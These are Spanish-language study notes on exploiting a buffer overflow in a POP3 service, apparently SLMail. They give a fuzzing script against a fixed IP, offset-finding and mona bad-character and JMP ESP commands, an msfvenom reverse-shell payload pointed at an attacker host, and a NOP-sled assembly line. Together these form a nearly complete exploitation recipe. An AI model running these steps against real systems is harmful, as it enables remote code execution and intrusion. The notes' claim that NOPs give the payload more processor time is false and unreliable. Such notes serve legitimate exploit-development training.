--------------------
- tags: #BufferOverflow #system #privilegeescalation 
---------------


### Mini script como plantilla de ayuda para explotar un servicio remoto

```python 3
import socket
import sys
from struct import pack
from time import sleep

# Variables globales
ip = "192.168.0.159"
port = 110

if len(sys.argv) != 2:
        print("Se requiere añadir un payload para la contraseña.\n\n \t + Ejemplo: python3 exploit.py AAAAAA" + "\n")
        exit(1)

payload = int(sys.argv[1])

#total_lenght = int(sys.argv[1])

s  = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))

banner = s.recv(1024)
print("\n[+] Banner del servicio:\n" + str(banner) + "\n")

sleep(3)

s.send(b"USER hola\r\n")
respuesta = s.recv(1024)
print("[+] Respuesta al usuario: \n" + str(respuesta) + "\n")

s.send(b"PASS " + b"A"*payload + b"\r\n")
respuesta2 = s.recv(1024)
print("[+] Respuesta a la contraseña: \n" + str(respuesta2) + "\n")


```




### Generar cadena de bytes para hallar el offset

	/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l numero de bytes

	/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 500

### Conocer el valor del offset a partir del valor del EIP en el crasheo

	/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0xValor de EIP 

	/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x34644633



	!mona  bytearray
	!mona bytearray -cpb '\x00\x0a\x0d'

025DA128 Es el valor de ESP

	!mona compare -a 0x025DA128 -f C:\Users\david\Desktop\Mona\bytearray.bin



### Generar payload con msfvenom

	msfvenom -p windows/shell_reverse_tcp --format py --platform windows -a x86 -b '\x00\x0a\x0d' LHOST=192.168.0.123 LPORT=443 EXITFUNC=thread


### Búsqueda de módulo para encontrar el jmp esp y saltar al ESP donde estará el payload

	!mona modules
(Buscamos uno con las cuatro primeras columnas en False y copiamos la dirección de la memoria)


┌──(root💀davidalonso)-[~/maquinas/BOF/second_try]
└─# /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb                  
nasm > jmp ESP
/tmp/nasmXXXX20230719-51582-cduzas:2: error: parser: instruction expected
Error: Assembler did not complete successfully: 1
nasm > jmp ESP
00000000  FFE4              jmp esp



	!mona find -s '\xFF\xE4' -m SLMFC.DLL

### Si con ese comando no encontramos nada, tambien podemos usar este:

	!mona findwild -s "JMP ESP"



### Añadir NOPS antes de enviar el payload

	payload = before_eip + eip + b"\x90"*50 + buf

> Los NOPS hacen referencia a ese b"\\x90"\*50 que se ve, esto le permite al programa asignarle más tiempo de procesador
> a nuestro payload, ya que de lo contrario no tendrá tiempo suficiente para ejecutarse. Se puede aumentar todavía más 
> si es necesario


















